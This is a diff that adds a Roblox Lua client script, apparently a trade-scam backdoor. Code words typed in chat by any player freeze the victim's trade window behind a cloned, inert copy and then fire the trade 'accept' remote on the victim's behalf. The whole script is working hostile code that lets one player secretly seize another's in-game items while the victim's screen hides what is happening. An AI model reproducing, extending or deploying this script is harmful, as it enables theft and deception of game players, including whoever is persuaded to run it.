@@ -1,0 +1,84 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local MainGui = PlayerGui:WaitForChild("Main") -- Replace with your GUI's container name
+
+-- Variable to store the cloned GUI
+local clonedGui = nil
+
+-- Function to freeze the Trade GUI
+local function freezeTradeGui()
+    local tradeGui = MainGui:FindFirstChild("Trade")
+    if tradeGui then
+        -- Clone the entire Trade GUI
+        clonedGui = tradeGui:Clone()
+        clonedGui.Parent = MainGui
+        clonedGui.Name = "FrozenTrade"
+        clonedGui.Position = tradeGui.Position
+        clonedGui.Size = tradeGui.Size
+
+        -- Disable interactions and remove scripts in the cloned GUI
+        for _, descendant in pairs(clonedGui:GetDescendants()) do
+            if descendant:IsA("GuiObject") then
+                descendant.Active = false
+            elseif descendant:IsA("LocalScript") or descendant:IsA("ModuleScript") then
+                descendant:Destroy()
+            end
+        end
+
+        -- Destroy the original Trade GUI
+        tradeGui:Destroy()
+        print("Trade GUI has been frozen and the original GUI was destroyed.")
+    else
+        print("Trade GUI not found.")
+    end
+end
+
+-- Function to unfreeze the Trade GUI by removing the cloned GUI
+local function unfreezeTradeGui()
+    if clonedGui and clonedGui.Parent then
+        clonedGui:Destroy()
+        clonedGui = nil
+        print("Cloned Trade GUI has been destroyed and unfrozen.")
+    else
+        print("No cloned Trade GUI to unfreeze.")
+    end
+end
+
+-- Function to handle chat message detection
+local function onPlayerChat(message, sender)
+    if message == "Hello1" then
+        -- Freeze the Trade GUI when the message "Hello1" is detected
+        print(sender.Name .. " sent the message 'Hello1'. Freezing the Trade GUI.")
+        freezeTradeGui()
+    elseif message == "Hello3" then
+        -- Unfreeze the Trade GUI when the message "Hello3" is detected
+        print(sender.Name .. " sent the message 'Hello3'. Unfreezing the Trade GUI.")
+        unfreezeTradeGui()
+    elseif message == "Hello2" then
+        -- Fire the remote when the message "Hello2" is detected
+        local args = {
+            [1] = "accept"
+        }
+        game:GetService("ReplicatedStorage").Remotes.TradeFunction:InvokeServer(unpack(args))
+        print(sender.Name .. " sent the message 'Hello2'. Firing the remote 'TradeFunction'.")
+    end
+end
+
+-- Function to connect chat events for a player
+local function connectPlayerChat(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChat(message, player)
+    end)
+end
+
+-- Connect chat events for all existing players
+for _, player in pairs(Players:GetPlayers()) do
+    connectPlayerChat(player)
+end
+
+-- Listen for new players and connect their chat events
+Players.PlayerAdded:Connect(function(player)
+    print("Player added: " .. player.Name)
+    connectPlayerChat(player)
+end)
